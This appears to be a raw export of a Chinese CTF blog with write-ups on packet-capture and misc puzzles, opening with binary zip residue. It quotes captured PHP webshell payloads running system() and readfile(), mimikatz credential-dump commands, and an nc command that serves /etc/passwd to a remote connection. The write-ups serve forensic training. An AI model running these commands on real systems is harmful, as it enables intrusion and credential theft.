O.?..%...&amp;...D.rn.....l..s...[...j.r.Mq.U...+...%H..j[&#96;.....&#x2F;..u..........f.&#123;....Nn.e.\\..-.&#125;.R.G.0...&#39;..6![k.*....4..J.......nmmqe..3...\\.....k....z9qx.CmG7.....;n.....q..,.+?.5..&#x3D;_&gt;......Mx.....s&lt;&#x2F;.o.b.~........zC1....k.t...\\.PC~....wj.w.m..]..qZ..l.....&#39;....p..._...0.^..... e..........|qnq&#x3D;.-......$T&#123;.Z4..6N.L..&lt;&gt;................7.s....&amp;F....vq..5....#.P8....B..d.._.,e........+.:.....r......T...\\..@@Y...A..;....jrD)..W.&#x2F;9ie.J.&#x2F;!..PK..........%j-E8I.......2....................flag.pngUT....|.Tux.............PK..........N......... 直接保存原始数据，解压拿到flag。 SimpleProtocol查看了一下，大多是http请求，后来数据包太多了，直接搜索flag，直接就看到flag。 BackdoorPOST /innerIntf/sorsi.html Capture the Hacker提示： 这是捕获的黑客攻击数据包，LateRain用户的密码在此次攻击中泄露了，你能找到吗？FLAG格式：SCTF{LateRain的明文密码}。 看了一下大概26个包，第一个包主要是连接shell，可以看到目标是windows系统。 1234567891011121314151617181920POST /config.php HTTP/1.1Cache-Control: no-cacheX-Forwarded-For: 136.0.217.252Referer: http://192.168.30.170Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)Host: 192.168.30.170Content-Length: 687Connection: Closeyo=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3DHTTP/1.1 200 OKConnection: closeDate: Fri, 14 Nov 2014 14:47:48 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETX-Powered-By: PHP/5.4.32Content-type: text/htmlContent-Length: 147-&gt;|c:\\inetpub\\wwwroot C: Windows NT ROOT-53DD5427BC 5.2 build 3790 (Windows Server 2003 Enterprise Edition Service Pack 2) i586(NETWORK SERVICE)|&lt;- 数据包中大多是一些连接shell之后的操作，比如列目录等等。 其中有一个数据包是打包根目录，具体细节看https://www.cnblogs.com/fetty/p/4769279.html 1234567891011121314151617181920212223242526272829303132333435POST /config.php HTTP/1.1Cache-Control: no-cacheX-Forwarded-For: 136.0.217.252Referer: http://192.168.30.170Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)Host: 192.168.30.170Content-Length: 733Connection: Closeyo=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=Y21k&amp;z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJkM6XHByb2dyYX4xXFdpblJBUlxyYXIgYSBDOlxJbmV0cHViXHd3d3Jvb3RcYmFja3VwXHd3d3Jvb3QucmFyIEM6XEluZXRwdWJcd3d3cm9vdFxiYWNrdXBcMS5naWYgLWhwSkpCb29tJmVjaG8gW1NdJmNkJmVjaG8gW0VdHTTP/1.1 200 OKConnection: closeDate: Fri, 14 Nov 2014 14:49:43 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETX-Powered-By: PHP/5.4.32Content-type: text/htmlContent-Length: 370-&gt;| 这里就是windows下使用rar命令的情况RAR 5.10 beta 4 .... (C) 1993-2014 Alexander Roshal 6 .... 2014........ ........ - 3000Yuan.......................... C:\\Inetpub\\wwwroot\\backup\\1.gifarchive ?.k?...... 12%.... 25%.... 38%.... 50%.... 63%.... 76%.... 89%....100%..... ...... RAR %d.%d .......... ............................ RAR ..............[S]c:\\inetpub\\wwwroot[E] |&lt;- 其中一个数据包是打开rar文件。 1yo&#x3D;%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1&#x3D;C%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5Cbackup%5C%5Cwwwroot.rar 解码查看一下： 123456789101112131415@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$F&#x3D;get_magic_quotes_gpc()?stripslashes($_POST[&quot;z1&quot;]):$_POST[&quot;z1&quot;];$fp&#x3D;@fopen($F,&quot;r&quot;);if(@fgetc($fp))&#123;@fclose($fp);@readfile($F);&#125;else&#123;echo(&quot;ERROR:&#x2F;&#x2F; Can Not Read&quot;);&#125;;echo(&quot;|&lt;-&quot;);die(); 1C:\\\\inetpub\\\\wwwroot\\\\backup\\\\wwwroot.rar 接下来是打开rar文件，解码查看一下具体命令。 123456789101112131415@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;&gt;|&quot;);;$p&#x3D;base64_decode($_POST[&quot;z1&quot;]);$s&#x3D;base64_decode($_POST[&quot;z2&quot;]);$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;&#x2F;c \\&quot;&#123;$s&#125;\\&quot;&quot;;$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;@system($r.&quot; 2&gt;&amp;1&quot;,$ret);print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;;echo(&quot;|&lt;-&quot;);die(); Z2: 1cd &#x2F;d &quot;c:\\inetpub\\wwwroot\\&quot;&amp;C:\\progra~1\\WinRAR\\rar a C:\\Inetpub\\wwwroot\\backup\\wwwroot.rar C:\\Inetpub\\wwwroot\\backup\\1.gif -hpJJBoom&amp;echo [S]&amp;cd&amp;echo [E] Z1: 1cmd 1cmd -c cd &#x2F;d &quot;c:\\inetpub\\wwwroot\\&quot;&amp;C:\\progra~1\\WinRAR\\rar a C:\\Inetpub\\wwwroot\\backup\\wwwroot.rar C:\\Inetpub\\wwwroot\\backup\\1.gif -hpJJBoom&amp;echo [S]&amp;cd&amp;echo [E] 2&gt;&amp;1 将压缩包提取出来，这里直接使用binwalk但是发现需要密码。JJBoom就是密码打开之后发现有一个1,gif但是大小为9M很可疑。 使用mimikatz破解密码。 123log d:\\1.txt #这一句很关键，将回显输出到一个文件中 sekurlsa::minidump 1.gifsekurlsa::logonpasswords full slimple从 leftover capture data可以看出是鼠标流量。每一个数据包的数据区有四个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移 tshark提取信息 1steady@steady:~$ tshark -r &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;simple.pcap -T fields -e usb.capdata &gt; usbdata.txt python解密 12345678910111213141516171819202122nums &#x3D; []keys &#x3D; open(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;usbdata.txt&#39;,&#39;r&#39;)keys2 &#x3D; open(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.txt&#39;,&#39;w&#39;)posx &#x3D; 0posy &#x3D; 0for line in keys: if len(line) !&#x3D; 9 : continue x &#x3D; int(line[2:4],16) y &#x3D; int(line[4:6],16) if x &gt; 127 : x -&#x3D; 256 if y &gt; 127 : y -&#x3D; 256 posx +&#x3D; x posy +&#x3D; y btn_flag &#x3D; int(line[0:2],16) if btn_flag &#x3D;&#x3D; 1 : print posx , posy steady&#x3D;str(posx)+&quot; &quot;+str(posy) keys2.write(steady+&quot;\\n&quot;)keys.close() 拿到坐标之后画图，拿到flag。 sqlinject提取数数据 123456789101112131415161718import urllib.parseimport ref=open(&quot;/Users/apple/Desktop/access.log&quot;,&quot;r&quot;)f1=open(&quot;/Users/apple/Desktop/sql.txt&quot;,&quot;w&quot;)for i in f.readlines(): i=urllib.parse.unquote(i) if &quot;flag_is_here&quot; in i: f1.write(i)f1.close()f.close()f3=open(&quot;/Users/apple/Desktop/sql.txt&quot;,&quot;r&quot;)f2=open(&quot;/Users/apple/Desktop/sql1.txt&quot;,&quot;w&quot;)for i in f3.readlines(): i=re.findall(r&quot;AND ORD([\\w|\\W]*)&#x27;RCKM&#x27;&quot;,i) if len(i): f2.write(i[0]+&quot;\\n&quot;) else: pass 最后根据sql盲注来判断flag。 2017厦门邀请赛 traffic提取ICMP数据包长度，转字符串。 1steady@steady:~$ tshark -r &#x2F;tmp&#x2F;2.pcapng -T fields -Y &quot;icmp&quot; -e &quot;_ws.col.Length&quot; 或者使用以下方式提取： 1steady@steady:~$ tshark -r &#x2F;tmp&#x2F;2.pcapng -T fields -Y &quot;icmp&quot; -e &quot;frame.len&quot; 2018 红帽杯 Not only Wiresharkurl比较敏感，提取出来。 1steady@steady:~$ tshark -r &#x2F;tmp&#x2F;222.pcapng -T fields -e &quot;http.request.uri&quot; | grep &quot;&#x2F;sqli&#x2F;&quot; &gt; url.txt 经过数据处理 1234import ref=open(&#x27;/Users/apple/Desktop/url.txt&#x27;,&#x27;r&#x27;)for i in f.readlines(): print(i.strip(),end=&quot;&quot;) 1123404B03040A0001080000739C8C4B7B36E495200000001400000004000000666C616781CD460EB62015168D9E64B06FC1712365FDE5F987916DD8A52416E83FDE98FB504B01023F000A0001080000739C8C4B7B36E4952000000014000000040024000000000000002000000000000000666C61670A00200000000000010018000DB39B543D73D301A1ED91543D73D301F99066543D73D301504B0506000000000100010056000000420000000000 发现像一个压缩包，zip压缩包，修改头得到压缩包。得到flag。 12345678910111213&#x2F;dirtrav&#x2F;example2.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;files&#x2F;hacker.png&#x2F;dirtrav&#x2F;example3.php?file&#x3D;hacker&#x2F;xss&#x2F;example4.php?name&#x3D;hacker&#x2F;xss&#x2F;example4.php?name&#x3D;hacker&#x2F;&#x2F;这个就是压缩包密码。&#x2F;xss&#x2F;example4.php?key&#x3D;?id&#x3D;1128%23&#x2F;dirtrav&#x2F;example1.php?file&#x3D;hacker.png&#x2F;dirtrav&#x2F;example2.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;files&#x2F;hacker.png&#x2F;dirtrav&#x2F;example3.php?file&#x3D;hacker&#x2F;dirtrav&#x2F;example1.php?file&#x3D;hacker.png&#x2F;dirtrav&#x2F;example2.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;files&#x2F;hacker.png&#x2F;dirtrav&#x2F;example3.php?file&#x3D;hacker&#x2F;codeexec&#x2F;example1.php?name&#x3D;hacker TRF06 ForeverDNS协议，查看一下是否有Type类型为txt的数据包，txt记录可以用来隐藏一些信息。果断没有。在一个藏有flag的就是域名的地方，域名拼接起来可能是某些编码，比如base58编码。 kali-tshark提取一下： 1steady@steady:~$ tshark -r &#x2F;tmp&#x2F;output.pcap -T fields -e &quot;dns.resp.name&quot; 数据处理 12345678910import reimport base64flag=&quot;&quot;f = open(&#x27;/Users/apple/Desktop/dns.txt&#x27;, &#x27;r&#x27;)for i in f.readlines(): steady_dns=re.findall(r&quot;(\\w*).gzpgs&quot;,i) if len(steady_dns): flag+=&quot;&quot;.join(steady_dns[0]) else: pass base58解码 12345C = &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;org = 0for d in flag: org = org*58 + C.index(d)print (&quot;%x&quot;%org).decode(&quot;hex&quot;) Fraud流量包中有一个图片请求，拿到图片之后是一个1M的图片，尝试常规隐血思路没有结果。后来发现在在tcp报文段中有 6Bit 的状态控制码, 其中有一个状态控制码是URG，叫紧急比特（urgent）, 当 URG＝1 时，表明紧急指针字段有效, 代表该封包为紧急封包。它告诉系统此报文段中有紧急数据，应尽快传送 (相当于高优先级的数据)。 1steady@steady:~$ tshark -r &#x2F;tmp&#x2F;fraud.pcap -T fields -e &quot;tcp.urgent_pointer&quot; 12345678910111213import red = open(&quot;/Users/apple/Desktop/tcp.txt&quot;,&quot;r&quot;).read().split(&quot; &quot;)flag=&quot;&quot;l=[]for i in d: if i!=&#x27;0&#x27;: print(i) l.append(i)for i in l: if len(i): flag+=chr(int(i))print(flag) TRF09 embarrass数据包有点大，简单看了一下有http、ftp，其中ftp下载了一个pcap文件，但是文件太大了打算提取出来但是最终失败了。 123456227 Entering Passive Mode (192,168,197,128,203,208)SIZE misc2.pcapng213 263619000RETR misc2.pcapng150 Connection accepted226 Transfer OK 最后使用strings命令直接提取flag。 steady@steady:~$ strings /tmp/misc_02.pcapng | grep “flag”GET /flag.php HTTP/1.1GET /flag.doc HTTP/1.1flag{Good_b0y_W3ll_Done}flag{Good_b0y_W3ll_Done}flag{Good_b0y_W3ll_Done}flag{Good_b0y_W3ll_Done} privateicmp数据较多。 tshark提取数据。 1steady@steady:~$ tshark -r &#x2F;tmp&#x2F;PrivateChannel.pcap.pcapng -x &quot;icmp and ip.src&#x3D;&#x3D;192.168.50.10&quot; | grep 0010 1234567891011121314151617181920212223242526270010 00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8 ... ..@..4..2...0010 00 1c 00 69 00 00 40 01 c6 eb c0 a8 32 0a c0 a8 ...i..@.....2...0010 00 1c 00 73 00 00 40 01 c6 e1 c0 a8 32 0a c0 a8 ...s..@.....2...0010 00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8 ... ..@..4..2...0010 00 1c 00 79 00 00 40 01 c6 db c0 a8 32 0a c0 a8 ...y..@.....2...0010 00 1c 00 6f 00 00 40 01 c6 e5 c0 a8 32 0a c0 a8 ...o..@.....2...0010 00 1c 00 75 00 00 40 01 c6 df c0 a8 32 0a c0 a8 ...u..@.....2...0010 00 1c 00 72 00 00 40 01 c6 e2 c0 a8 32 0a c0 a8 ...r..@.....2...0010 00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8 ... ..@..4..2...0010 00 1c 00 66 00 00 40 01 c6 ee c0 a8 32 0a c0 a8 ...f..@.....2...0010 00 1c 00 6c 00 00 40 01 c6 e8 c0 a8 32 0a c0 a8 ...l..@.....2...0010 00 1c 00 61 00 00 40 01 c6 f3 c0 a8 32 0a c0 a8 ...a..@.....2...0010 00 1c 00 67 00 00 40 01 c6 ed c0 a8 32 0a c0 a8 ...g..@.....2...0010 00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8 ... ..@..4..2...0010 00 1c 00 3a 00 00 40 01 c7 1a c0 a8 32 0a c0 a8 ...:..@.....2...0010 00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8 ... ..@..4..2...0010 00 1c 00 53 00 00 40 01 c7 01 c0 a8 32 0a c0 a8 ...S..@.....2...0010 00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8 ...3..@..!..2...0010 00 1c 00 63 00 00 40 01 c6 f1 c0 a8 32 0a c0 a8 ...c..@.....2...0010 00 1c 00 72 00 00 40 01 c6 e2 c0 a8 32 0a c0 a8 ...r..@.....2...0010 00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8 ...3..@..!..2...0010 00 1c 00 74 00 00 40 01 c6 e0 c0 a8 32 0a c0 a8 ...t..@.....2...0010 00 1c 00 34 00 00 40 01 c7 20 c0 a8 32 0a c0 a8 ...4..@.. ..2...0010 00 1c 00 67 00 00 40 01 c6 ed c0 a8 32 0a c0 a8 ...g..@.....2...0010 00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8 ...3..@..!..2...0010 00 1c 00 6e 00 00 40 01 c6 e6 c0 a8 32 0a c0 a8 ...n..@.....2...0010 00 1c 00 74 00 00 40 01 c6 e0 c0 a8 32 0a c0 a8 ...t..@.....2... first-contact机器人正在与坠毁的船舶通信。您的目标是通过检查网络流量来查找船舶的位置。题目是first所以尝试追踪第一个tcp流。 1tcp.stream eq 0 123456789101112131415ROBOT BOOTUP INITIALIZINGSPACE SHIP READYBOOTUP BEGINFIRMWARE STATUS.... COMPLETELOCATION STATUS.... ERROR****BOOT ERROR****COULD NOT READ FROM DISK ID 0xEF982DA0INITIALIZE RECOVERY PROCEDURE 0xCD950422PROCEDURE 0xCD950422 STATUS.... COMPLETEAWAITING NEW LOCATION STATUSNEW LOCATION STATUS: 302NEW LOCATION COORDINATES: 37 14&#39;06&quot;N 115 48&#39;40&quot;WNEW LOCATION INFO: LOCKEDNEW LOCATION UPDATE COMPLETENEW LOCATION UPDATE SUCCESS voip电话-&gt;VoIP通话，可以直接听到通话内容。 VoIP提取语音。 digital-camouflage获取数据包中用户登录的密码。 http.request.method eq POST 过滤出post请求 查看form表单的数据。 或者直接搜索字符串user、passwd等常见字段。 No_Big_Deal分析一下协议，有ftp协议，追踪流，看到存储了一个key文件，后缀保存为ssc。并且打开之后发现有许多TLSv1.2的数据。有些数据已经进行加密，其中某一个ip进行了http请求内容已经加密。 12345678STOR ssc.key150 Connecting to port 43935226-File successfully transferred226 0.001 seconds (measured here), 4.59 Mbytes per secondQUIT221-Goodbye. You uploaded 4 and downloaded 0 kbytes.221 Logout. 接着提取出来。协议分级可以看到还有smpt流量，但是找不到该流量，联系ftp找到的密钥才想可能被加密过。 进行解密，新版本wireshark没有ssl，直接搜索TLS 过滤流量，在解密流量中拿到flag。 1ip.addr &#x3D;&#x3D; 52.214.142.175 and http SSL Sniff过滤ssl协议，密钥隐藏在证书的stateOrProvinceName字段中。 FTPhttp.host contains tribalwars过滤出tribalwars网站的数据包 找到post的数据请求得到账户和密码 DFA/CCSC Spring 2020 CTFshell.pcap安装ncat，然后开放9999端口并将/etc/passwd输送到999端口。 12345jtomato@ns01:~$ echo &quot;*umR@Q%4V&amp;RC&quot; | sudo -S nc -nvlp 9999 &lt; &#x2F;etc&#x2F;passwdecho &quot;*umR@Q%4V&amp;RC&quot; | sudo -S nc -nvlp 9999 &lt; &#x2F;etc&#x2F;passwdListening on [0.0.0.0] (family 0, port 9999)Connection from 192.168.2.244 34972 received!jtomato@ns01:~$ exit 1flag&#123;9999&#125; 反向外壳监听哪个端口？ 1flag&#123;4444&#125; 什么文件添加到第二个外壳？ 1flag&#123;&#x2F;etc&#x2F;passwd&#125; smb.pcapng1What is the tree that is being browsed? 使用操作码过滤，最终被浏览的共享为\\public 1smb2.cmd &#x3D;&#x3D; 3 1What is the path of the file that is opened? 使用操作码过滤，找到打开的文件路径 1What is the hex status code when the user SAMBA\\jtomato logs in? 使用操作码过滤，用户登录失败 1There is a nice simple flag in the file that was accessed. SMB访问了一个文件，我们需要把它提取出来，wireshark可以直接提取文件。 直接搜索flag 1flag&lt;OneSuperDuperSecret&gt; SMB2操作码列表 123456789101112131415161718192021222324252627282930313233343536373839SMB2 commands listed by opcode value. Every Command PDU starts with a SMB2&#x2F;BufferCode.0x00 SMB2&#x2F;NegotiateProtocol0x01 SMB2&#x2F;SessionSetup0x02 SMB2&#x2F;SessionLogoff0x03 SMB2&#x2F;TreeConnect0x04 SMB2&#x2F;TreeDisconnect0x05 SMB2&#x2F;Create0x06 SMB2&#x2F;Close0x07 SMB2&#x2F;Flush0x08 SMB2&#x2F;Read0x09 SMB2&#x2F;Write0x0a SMB2&#x2F;Lock0x0b SMB2&#x2F;Ioctl0x0c SMB2&#x2F;Cancel0x0d SMB2&#x2F;KeepAlive0x0e SMB2&#x2F;Find0x0f SMB2&#x2F;Notify0x10 SMB2&#x2F;GetInfo0x11 SMB2&#x2F;SetInfo0x12 SMB2&#x2F;Break","categories":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}]},{"title":"CTF-杂项刷题1","slug":"CTF-杂项刷题3","date":"2019-05-06T20:23:20.000Z","updated":"2020-11-15T10:00:21.012Z","comments":true,"path":"2019/05/07/CTF-杂项刷题3/","link":"","permalink":"http://s1eady.top/2019/05/07/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%983/","excerpt":"","text":"CTF-show杂项misc_问青天kali分离图片 1steady@steady:~$ foremost /home/steady/桌面/steady/welcome.gif #//这里直接把图片从压缩包中分离出来。 难道一个压缩包。需要密码。接着查看welcome.gif十六进制。搜索464f524d00(aiff文件头)，接着输入zip密码。解压拿到图片其中将-当作0，| 当作1。二进制转字符串，拿到flag。、 1234567s = &#x27;01100110 01101100 01100001 01100111 01111011 01100011 01110100 01100110 01011111 01110011 01101000 01101111 01110111 01011111 01101111 01100110 01011111 01100111 01101111 01101100 01100100 01011111 01110010 01100101 01100011 01101111 01110010 01100100 01111101&#x27;s_list = s.split(&#x27; &#x27;)flag = &#x27;&#x27;for i in range(len(s_list)): flag += chr(int(s_list[i],2))print(flag) misc50打开一张图片，图片比较大，应该藏有东西，直接binwalk、或者formost分离出1个压缩包。压缩包注释写有GEZDGNBVGYFA==== ，base32解密，作为密码解压，发现一个txt。发现有重复的3078，开头的3078作为十六进制转字符串是0x。截取其中一部分3078333730783761,转十六进制得0x370x7a,正好是7z压缩包头。写脚本转换一下。 123456789101112131415161718192021222324252627282930import redef read_file(filepath): with open(filepath) as fp: content=fp.read(); return contentnumber = read_file(&#x27;1.txt&#x27;)result = []result.append(re.findall(r&#x27;.&#123;2&#125;&#x27;, number))result = result[0]strings =&#x27;&#x27;for i in result: y = bytearray.fromhex(i) z = str(y) z= re.findall(&quot;b&#x27;(.*?)&#x27;&quot;,z)[0] strings += zb= strings.split(&#x27;0x&#x27;)strings=&#x27;&#x27;for i in b: if len(i) ==1: i= &#x27;0&#x27; + i strings +=iwith open(&#x27;test.txt&#x27;, &#x27;w&#x27;) as f: f.write(strings) 拿到压缩包的十六进制，使用winhex制作压缩包。打开之后发现有密码。然后用给的图片放入winhex中发现有一串十六进制，解密拿到压缩包密码。解压之后发现是以tESkpFRktQSjVIVTZUMlBJPQ==结尾，尝试十六进制解密。解密之后还是base64，猜测是循环加密。 这里使用脚本解密 base64 1234567891011121314import base64import redef read_file(filepath): with open(filepath) as fp: content=fp.read(); return contenturl = read_file(&#x27;test11.txt&#x27;)url = re.findall(&quot;b&#x27;(.*?)&#x27;&quot;,url)[0]url = base64.b64decode(url)with open(&#x27;test12.txt&#x27;, &#x27;w&#x27;) as f: f.write(str(url)) base32 1234567891011121314import base64import redef read_file(filepath): with open(filepath) as fp: content=fp.read(); return contenturl = read_file(&#x27;test15.txt&#x27;)url = re.findall(&quot;b&#x27;(.*?)&#x27;&quot;,url)[0]url = base64.b32decode(url)with open(&#x27;test16.txt&#x27;, &#x27;w&#x27;) as f: f.write(str(url)) 一共进行了十六次解密。解密之后是一串 fuck/Ook!。在线网站解密。拿到flag。 misc21outguess解密 1outguess -k 123456 -r 4.jpg hidden.txt 压缩包放到winhex中发现尾部，有09 0A 0D 20 这些交替出现。 放到notepad++中，直接十六进制转换ascii。 123409→ tab符20→空格0A→\\r0D→\\n 然后放到sublim中替换为莫斯密码。 1234tab 替换 -空格 替换 .tab 替换&#x2F;\\n 替换&#x2F; 解密得到flag。 setg10拿到一张图片，放入winhex中发现，一串类似于base64的值，但是字符串最后有两个点，两个点替换为==。base64解码。 stega10https://www.lanzous.com/i9b0ksd 下载之后拿到一个压缩包，压缩包中有一个文件名字为密码，打开之后有十个txt文件，名字也为密码，而且文件大小很少，尝试爆破crc把这几个文件的内容组成压缩包密码。 这里文件大小为1字节，所以尝试一下一位crc。 123456789101112import binasciiimport stringdic&#x3D;string.printable#输入密码文件的CRC码crcl&#x3D;[0xF3B61B38,0xF3B61B38,0X6ABF4A82,0X5ED1937E,0X09b9265b,0x84b12bae,0x70659eff,0x90b077e1,0x6abf4a82]key &#x3D; &#39;&#39;for crc in crcl: for i in dic: if crc&#x3D;&#x3D;(binascii.crc32(i)&amp;0xffffffff): key &#x3D;key + i print key 红包第五题打开压缩包里面有一个mp3，然后把压缩包放入01eidoter中发现，提示载入错误，说明还有别的文件，然后发现压缩包尾部有jpg的文件尾部，直接提取出jpg。 jpg头部FFD8FFE0 jpg尾部8A0FFD9 提取出jpg使用steghide工具，提取文本，在该工具目录下发现flag.txt 123F:\\CTF-tools\\图片隐写\\steghide&gt;steghide.exe extract -sf C:\\Users\\12521\\Desktop\\1.jpgEnter passphrase:wrote extracted data to &quot;flag.txt&quot;. 其中有一串密文 1aHR0cHM6Ly93d3cubGFuem91cy5jb20vaTlkcGp4ZQ&#x3D;&#x3D; 解密拿到一个网址 1https:&#x2F;&#x2F;www.lanzous.com&#x2F;i9dpjxe 拿到一个压缩包，打开里面的txt是许多数字。但是没有大于F的所以直接16进制→10进制→ascii码。两个一组。 12345steady_str=open(&#x27;flag.txt&#x27;,&#x27;r&#x27;).read()flag=&quot;&quot;for i in range(0,len(steady_str),2): flag+=chr(int(steady_str[i:i+2],16))print(flag) 转换之后拿到一个坐标。使用正则表达式提取坐标。 1234import ref=open(&#x27;tupian.txt&#x27;,&#x27;r&#x27;).read()steady_key=re.findall(&#x27;\\((.*?)\\)&#x27;,f)print(steady_key) 将坐标写入文件 123steady_flag=open(&#x27;steady_flag.txt&#x27;,&#x27;w&#x27;)for i in steady_key: steady_flag.write(i+&#x27;\\n&#x27;) 查看坐标的数量，进行分解，求得长和宽。 12345a=5328for i in range(0,1000): for j in range(0,1000): if (i*j)==a: print(i,j) 1234567(36, 148)(37, 144)(48, 111)(72, 74)(74, 72)(111, 48)(144, 37) RDB画图 123456789101112131415161718192021#-*- coding:utf-8 -*-from PIL import Imageimport rex = 72 #x坐标 通过对txt里的行数进行整数分解y = 74 #y坐标 x*y = 行数im = Image.new(&quot;RGB&quot;,(x,y))#创建图片file = open(&#x27;rgb2.txt&#x27;) #打开rbg值文件#通过一个个rgb点生成图片for i in range(0,x): for j in range(0,y): line = file.readline()#获取一行 # line = line.replace(&#x27;\\n&#x27;,&#x27;&#x27;) print(line) rgb = line.split(&quot;,&quot;)#分离rgb print(rgb) im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素im.show()im.save(&#x27;1.png&#x27;) 扫码拿到flag。 红包第八题大致原理就是一个mp4文件，读取之后转十六进制，然后每个十六进制反序。得到一个新的mp4文件。 1234f=open(&#x27;NBA.mp4&#x27;,&#x27;r&#x27;)data=f.read()for i in data: print hex(ord(i)) 12345678910f=open(&#x27;1.txt&#x27;,&#x27;r&#x27;)data=f.readlines()d=&#x27;&#x27;for i in data: result=i.replace(&quot;\\n&quot;,&quot;&quot;).replace(&quot;0x&quot;,&quot;&quot;) if len(result)!=2: d+=chr(int(&#x27;0x&#x27;+result+&#x27;0&#x27;,16)) else: d+=chr(int(&#x27;0x&#x27;+result[::-1],16))print d 